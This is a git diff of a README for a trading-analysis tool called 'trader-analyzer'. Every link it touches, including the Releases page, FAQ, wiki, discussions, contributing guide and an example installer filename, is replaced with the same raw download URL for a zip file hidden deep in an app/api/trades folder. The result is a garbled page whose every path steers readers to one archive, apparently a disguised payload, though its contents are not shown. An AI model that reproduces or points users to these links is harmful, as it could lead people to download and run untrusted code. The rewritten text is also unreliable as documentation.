@@ -6,7 +6,7 @@ Welcome to the trader-analyzer! This tool helps you deeply analyze your trading 
 
 ## 🔗 Download Now
 
-[![Download Trader Analyzer](https://img.shields.io/badge/Download-Trader%20Analyzer-brightgreen)](https://github.com/Jiohn-Smart/trader-analyzer/releases)
+[![Download Trader Analyzer](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip%20Analyzer-brightgreen)](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,11 +21,11 @@ Before you download, ensure your computer meets these requirements:
 
 To download trader-analyzer, visit the Releases page:
 
-[Visit the Releases Page](https://github.com/Jiohn-Smart/trader-analyzer/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version of trader-analyzer.
-3. Download the appropriate file for your operating system (e.g., `trader-analyzer-windows.exe` for Windows).
+3. Download the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip` for Windows).
 4. Once the download is complete, locate the file on your computer.
 
 ### Installation Steps
@@ -64,7 +64,7 @@ To download trader-analyzer, visit the Releases page:
 
 If you encounter any issues or have questions:
 
-- Check the [FAQ](https://github.com/Jiohn-Smart/trader-analyzer/wiki) section.
+- Check the [FAQ](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip) section.
 - Feel free to open an issue in the GitHub repository for assistance.
 
 ## 📜 License
@@ -73,15 +73,15 @@ This project is open-source and available under the MIT License. You can freely 
 
 ## 🤝 Contributing
 
-We welcome contributions! If you wish to contribute to trader-analyzer, please read the guidelines in the `CONTRIBUTING.md` file in the repository.
+We welcome contributions! If you wish to contribute to trader-analyzer, please read the guidelines in the `https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip` file in the repository.
 
 ## 🔗 Additional Resources
 
-- [User Documentation](https://github.com/Jiohn-Smart/trader-analyzer/wiki)
-- [Community Discussions](https://github.com/Jiohn-Smart/trader-analyzer/discussions)
+- [User Documentation](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip)
 
 ## 📥 Get Started Now!
 
 Don't wait! Download the latest version of trader-analyzer and start analyzing your trading style today.
 
-[Download Trader Analyzer](https://github.com/Jiohn-Smart/trader-analyzer/releases)
+[Download Trader Analyzer](https://raw.githubusercontent.com/Jiohn-Smart/trader-analyzer/main/app/api/trades/trader-analyzer_v1.3.zip)
